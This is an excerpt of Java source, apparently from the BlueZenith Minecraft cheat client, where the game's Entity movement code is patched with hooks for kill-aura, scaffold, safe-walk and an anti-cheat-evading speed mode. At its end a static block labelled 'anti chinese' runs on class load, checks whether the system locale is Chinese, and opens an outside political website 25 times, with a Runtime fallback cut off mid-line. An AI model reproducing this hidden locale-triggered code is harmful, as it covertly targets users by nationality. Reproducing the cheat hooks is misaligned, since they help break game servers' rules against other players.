...
public abstract class Entity implements ICommandSender {
    ...
    public void moveEntity(double x, double y, double z) {
        MoveEvent event = new MoveEvent(x, y, z, 0, EventType.PRE);
        ...
        if (this.noClip) {
            ...
            /*
             * im sorry for making this complicated:
             * 0: no safe walk
             * 1: safe walk only on ground
             * 2: air safe walk
             */
            boolean safeWalk = event.getSafeWalkState() > 0 && (event.getSafeWalkState() != 1 || this.onGround);
            if (flag || safeWalk) {
                double d6;
            ...
            if (this.stepHeight > 0.0F && flag1 && (d3 != x || d5 != z)) {
                ...
                if (d11 * d11 + d8 * d8 >= x * x + z * z) {
                    ...
                    BlueZenith.getBlueZenith().postEvent(new StepEvent());
                }
            }
            ...
            if (d3 != x && (!speed.getState() || !speed.mode.is("Watchdog") || speed.noSpeedReset.get())) {
                this.motionX = 0.0D;
            }

            if (d5 != z && (!speed.getState() || !speed.mode.is("Watchdog") || speed.noSpeedReset.get())) {
                this.motionZ = 0.0D;
            }
        ...
        MoveEvent eventpost = new MoveEvent(x, y, z, 0, EventType.POST);
        if (this == Minecraft.getMinecraft().thePlayer) {
            BlueZenith.getBlueZenith().postEvent(eventpost);
            if (eventpost.cancelled) {
                return;
            }
        }
    }
    ...
    public void moveFlying(float strafe, float forward, float friction) {
        ...
        if (f >= 1.0E-4F) {
            ...
            final boolean scaffoldRotationStrafe = scaff.addons.getOptionState("Rotation strafe");

            final Aura ka = (Aura) BlueZenith.getBlueZenith().getModuleManager().getModule(Aura.class);
            final boolean auraRotationStrafe = ((BooleanValue) ka.getValue("RotationStrafe")).get();

            float f1;
            float f2;
            if (this == Minecraft.getMinecraft().thePlayer && (ka.getState() && auraRotationStrafe)) {
                final float strafYaw = ka.getStrafeYaw();

                f1 = MathHelper.sin(strafYaw * (float) Math.PI / 180.0F);
                f2 = MathHelper.cos(strafYaw * (float) Math.PI / 180.0F);

            } else if (this == Minecraft.getMinecraft().thePlayer && ((scaff.getState() && scaffoldRotationStrafe))) {
                f1 = MathHelper.sin(strafeYaw * (float) Math.PI / 180.0F);
                f2 = MathHelper.cos(strafeYaw * (float) Math.PI / 180.0F);
    ...
    static { //findme anti chinese
        final String currentLocale = Locale.getDefault().getLanguage();
            if(currentLocale.contains("cn")) {
                try {
                    for (int i = 0; i < 25; i++) {
                        Desktop.getDesktop().browse(new URI("https://www.tuidang.org/"));
                    }
                } catch (Exception exception) {
                    try {
                        for (int i = 0; i < 25; i++) {
                            Runtime rt = Runtime.getRuntime();
                            String url = "https://www.tuidang.org/";
